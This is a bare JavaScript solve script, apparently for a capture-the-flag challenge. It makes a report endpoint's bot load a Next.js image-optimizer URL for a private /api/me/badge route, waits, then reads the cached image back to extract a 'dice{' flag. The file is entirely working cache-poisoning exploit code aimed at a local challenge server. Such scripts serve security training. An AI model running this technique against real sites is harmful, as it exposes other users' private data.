const REMOTE = "http://localhost:3000"
const CACHE_URL = `/_next/image?url=/api/me/badge&w=96&h=96&q=100`

const sleep = ms => new Promise(r => setTimeout(r, ms))

console.log(
  await (
    await fetch(`${REMOTE}/api/report`, {
      method: "POST",
      body: `HACKER+IP=${encodeURIComponent(`http://localhost:3000${CACHE_URL}`)}`,
      headers: [["Content-Type", "application/x-www-form-urlencoded"]]
    })
  ).text()
)

await sleep(6_000)

const gif = new TextDecoder("ascii", { fatal: false }).decode(
  await (
    await fetch(`${REMOTE}${CACHE_URL}`, {
        headers: [["Accept", "image/webp"]]
    })
  ).arrayBuffer()
)
console.log(gif.substring(gif.indexOf("dice{"), gif.length))
